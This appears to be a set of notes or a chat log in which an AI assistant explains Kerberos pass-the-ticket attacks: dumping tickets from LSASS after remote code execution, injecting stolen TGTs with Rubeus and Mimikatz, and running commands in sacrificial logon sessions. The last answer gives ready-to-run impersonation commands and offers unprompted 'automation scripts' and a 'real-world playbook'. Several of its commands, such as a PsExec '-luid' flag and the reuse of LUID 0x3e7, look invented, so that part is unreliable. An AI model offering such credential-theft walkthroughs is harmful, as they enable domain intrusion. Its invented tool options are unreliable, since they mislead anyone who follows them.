# Summary
For every windows logon session there is only one TGT and a TGS for each target service "SPN" the process tries to communicate to , And when you use `/ptt` you are overwriting the original TGT or TGS. That may make issues if there is services running in the current logon session that need specific user context which make them unable to continue there jobs. So there is 2 solutions for these problem. First, don't use `/ptt` and pass the ticket using `/ticket`. Second, create Sacrificial Processes that has its the injected TGT so by doing this we don't effect the original TGT ticket.

---

> [!Question]
> why do we need Sacrificial Processes in pass-the-ticket technique? what is the main problem?
> is the problem of deleting the TGS or TGT of the host so that make it unable to use other services in the domain?

In the pass-the-ticket (PTT) technique—commonly used in Active Directory penetration testing and red teaming—a stolen Kerberos ticket (typically a Ticket-Granting Ticket or TGT, but sometimes a service ticket or TGS) is injected into an attacker's session to impersonate a user and gain unauthorized access to resources without needing their password or hash. This allows lateral movement or privilege escalation in a domain.

### The Main Problem Addressed by Sacrificial Processes
The core issue with PTT arises when injecting a ticket directly into your *current logon session* (e.g., via tools like Mimikatz's `kerberos::ptt` or Rubeus's `/ptt` option). Each Windows logon session can hold only *one primary TGT at a time*. If you inject a stolen TGT, it overwrites the existing one in your session. This can lead to several problems:
- **Loss of Original Session Functionality**: Your current session loses its original authentication capabilities. For example, you might no longer be able to access other domain resources or services that relied on your original TGT, effectively "locking yourself out" of ongoing operations in that session.
- **Session Instability or Detection Risk**: Overwriting tickets can cause authentication failures, trigger security alerts (e.g., via endpoint detection tools monitoring LSASS memory changes), or corrupt the session, forcing a logout or reboot.
- **Impersonation Conflicts**: If you're already authenticated as one user and inject a ticket for another, the mismatch can break single sign-on (SSO) flows or lead to inconsistent behavior across tools/commands.

This is especially risky during an engagement where you need to maintain persistence or switch between contexts without disrupting your foothold.

### Why We Need Sacrificial Processes
To avoid these issues, a *sacrificial process* (also called a sacrificial logon session) is created as an isolated environment to hold the injected ticket. This is essentially a new, temporary process (often hidden or non-interactive) spawned specifically for the PTT operation. You inject the ticket into *this* process instead of your main one, then execute commands (e.g., remote access via psexec or RDP) within its context. Once done, you can discard the process without affecting your primary session.

Common ways to create one:
- **Rubeus**: Use the `/createnetonly` option to spawn a hidden process (e.g., `cmd.exe`), inject the ticket, and run commands in it.
- **Mimikatz**: Combine with `runas /netonly` to create a new session for ticket application.
- **PowerShell**: Tools like PowerView or custom scripts can invoke similar isolated sessions.

This approach preserves your original session's tickets and stability while allowing safe impersonation.

### Is It About Deleting the Host's TGS or TGT?
No, the problem (and the use of sacrificial processes) is not related to deleting or modifying tickets on the *target host* (e.g., making it unable to use domain services). PTT doesn't alter the target's Kerberos state—it only involves stealing and replaying tickets from memory (e.g., via LSASS dumps). The host's tickets remain intact and functional for legitimate use. The sacrificial process is purely an attacker-side technique to manage session isolation and avoid self-sabotage during the attack. If anything disrupts the target, it would be from separate techniques like resource hijacking, not PTT itself.

---

> [!Question] 
> now let me say this, imagine i have RCE on computer that has services and have TGTs stored, there is 2 methods of using those TGTs by dumping them and put each one as /ptt "inject in the process" which may make problems or we may use tools like rubeus with /ticket option that may prevent us from losing the original ticket


In scenarios where you've achieved remote code execution (RCE) on a target Windows machine in an Active Directory environment (e.g., via tools like psexec.py or wmiexec.py), you can often extract stored Kerberos tickets from LSASS memory. This is typically done with tools like Mimikatz (`sekurlsa::tickets /export`) or Rubeus (`triage` followed by `dump /luid:0x...`). These dumped tickets (usually in .kirbi format) can then be used for pass-the-ticket (PTT) to impersonate users for lateral movement or privilege escalation.

You're correct that there are essentially two approaches to leveraging these TGTs (Ticket-Granting Tickets), each with trade-offs regarding session stability. I'll break it down below, focusing on the problems with direct injection and how the /ticket option helps mitigate them. This assumes ethical lab/testing contexts only.

### Method 1: Dumping and Direct Injection (/ptt)
- **Process**:
  - Dump the TGTs from the remote machine (via your RCE shell).
  - Transfer the .kirbi files back to your attacker machine.
  - Inject each one into your current logon session using `/ptt` (pass-the-ticket):
    - With Rubeus: `Rubeus.exe ptt /ticket:ticket.kirbi` (or base64 equivalent).
    - With Mimikatz: `kerberos::ptt ticket.kirbi`.
  - Once injected, the TGT is applied to your session, allowing you to request service tickets (TGS) or access resources as the impersonated user (e.g., `dir \\target\C$`).
- **Main Problems**:
  - **Overwriting the Original Ticket**: Windows logon sessions can only hold one primary TGT at a time. Injecting a new one overwrites your existing session's TGT, potentially breaking authentication for ongoing operations in that session (e.g., you lose access to other domain resources tied to your original credentials).
  - **Session Disruption**: This can lead to instability, authentication failures, or even force a logout/reboot in your attacker session. In multi-step attacks, it risks "locking yourself out" mid-engagement.
  - **Detection Risk**: Modifying LSASS or injecting into active sessions can trigger EDR/AV alerts more easily.
  - **Not Scalable for Multiple Tickets**: Switching between multiple dumped TGTs requires purging (`klist purge` or `Rubeus.exe purge`) and re-injecting each time, exacerbating the overwrite issue.
- **When to Use**: Quick, one-off impersonations where session stability isn't critical.

To mitigate these (as discussed previously), you can inject into a *sacrificial process* instead:
- Use Rubeus's `/createnetonly` to spawn an isolated process: `Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /ticket:ticket.kirbi`.
- This creates a new logon session (type 9, network-only) for the ticket, leaving your original session untouched. Run commands in the new process.

### Method 2: Using /ticket Option (Without Injection)
- **Process**:
  - Dump and transfer the TGTs as in Method 1.
  - Instead of injecting, pass the TGT directly to Rubeus commands via `/ticket:<base64> | /ticket:<file.kirbi>` for on-the-fly use.
  - Examples:
    - Request a TGS for a service: `Rubeus.exe asktgs /ticket:ticket.kirbi /service:cifs/target.domain.local /dc:dc.domain.local /ptt` (note: /ptt here is optional—if omitted, it just outputs the TGS without injecting).
    - Perform S4U (constrained delegation abuse): `Rubeus.exe s4u /ticket:ticket.kirbi /impersonateuser:administrator /msdsspn:http/target.domain.local`.
    - Renew a ticket: `Rubeus.exe renew /ticket:ticket.kirbi`.
  - The /ticket option supplies the TGT as input for the command, allowing you to forge/request new tickets or perform actions without altering your session.
- **How It Prevents Losing the Original Ticket**:
  - No injection means no overwrite—your session's existing TGT remains intact.
  - The command uses the provided ticket transiently (in memory for that operation only), so you can chain multiple TGTs without purging or switching sessions.
  - Lower detection footprint since you're not modifying logon sessions.
- **Limitations**:
  - Not all actions work without injection (e.g., native Windows tools like mstsc or dir often require a cached ticket in the session for SSO).
  - For full access (e.g., RDP or WinRM), you might still need to output a TGS and inject it into a sacrificial process.
  - Requires the command to support /ticket (most Rubeus actions do, like asktgt, asktgs, s4u, diamond).
- **When to Use**: Multi-ticket scenarios, maintaining stealth/stability, or when you only need to request derivative tickets (e.g., TGS for specific SPNs).

### Key Recommendations
- Always verify tickets post-dump with `klist` or `Rubeus.exe klist`.
- In RCE contexts, minimize on-target execution—dump remotely if possible (e.g., via Mimikatz over DCOM).
- Combine with sacrificial processes for hybrid safety: Use /ticket to generate a TGS, then inject that into a new process via /createnetonly.
- Alternatives: On Linux, Impacket's `gettgt.py` and `getst.py` support similar non-injective use with `-k` for Kerberos (ccache files).

This aligns with standard red team practices to preserve your foothold while impersonating. If you share more specifics (e.g., exact Rubeus errors), I can troubleshoot further.

---

> [!Question]
> cool if i created new process and injected the tgt inside of it, how can i go to that process?
> or switch my current cmd or powershell to process that has that ticket specially if don't have GUI or i only have RCE without RDB or interface

Great question — and this is where most people hit the wall the first time they try PTT in real‑world red‑team environments.
When you inject a TGT into a **sacrificial process**, you don’t _switch into the process_ — instead, you **execute commands _as_ that logon session by referencing its LUID (logon session ID)**.
### Think of it like this:
You don’t "jump into" the process.  
You "borrow its identity" for any new process you create.

---

## 🔥 You Use the Ticket by Starting Commands Under That Logon Session

So workflow becomes:

1. **Create sacrificial logon session**
2. **Inject TGT into it**
3. **Start commands inside that security context**
---

### Example using Rubeus — create session + inject + execute commands

#### 1. Create a new logon session:

```powershell
Rubeus.exe createnetonly /program:powershell.exe /show
```

This returns an `LUID` — save it.

#### 2. Inject ticket into that session:

```powershell
Rubeus.exe ptt /ticket:ticket.kirbi /luid:0x3e7
```

#### 3. Start commands using that session:

```powershell
Rubeus.exe asktgs /service:cifs/FILESERVER.domain.local /luid:0x3e7
```

Or launch a command under that token using:

```powershell
PsExec.exe -i -d powershell.exe -luid 0x3e7
```

Or via `token::exec` from mimikatz:

```powershell
mimikatz # sekurlsa::tickets /luid:0x3e7
mimikatz # kerberos::ptt ticket.kirbi
mimikatz # token::exec /luid:0x3e7 cmd.exe
```

This spawns a new shell **that is running with the injected Kerberos ticket**.

---

## 🧨 If you only have RCE / no interactive shell

You can still leverage the ticket.

For example, if your foothold is **non‑interactive command execution**, like:

```
webshell
scheduled task
reverse shell with no desktop
```

You don’t "switch" to a session — you **launch a new process inside the ticketed session** and redirect output back to you.

Example:

```powershell
Rubeus.exe createnetonly /program:"whoami /groups" /show
Rubeus.exe ptt /ticket:DA.kirbi /luid:0xXXXX
runas /netonly /user:domain\administrator "powershell -c ipconfig"
```

OR dump to file:

```powershell
PsExec64.exe -luid 0xXXXX cmd.exe /c "dir C:\ > C:\temp\output.txt"
type C:\temp\output.txt
```

That command is executed **using the forged TGT context**, even though you never "interacted" with that process directly.

---

## Key takeaway

> You don’t jump _into_ the sacrificial process.  
> You _run commands inside_ it using its LUID, token or logon session.

---

If you want I can provide:

📌 Full no‑GUI PTT workflow  
📌 Automation script for red team ops  
📌 Method to pivot SMB, LDAP, WinRM, RDP through injected ticket  
📌 How to do this during _only‑RCE with no shell_

Just say **"show me a no‑GUI PTT workflow"** and I’ll generate the full real‑world playbook. 🔥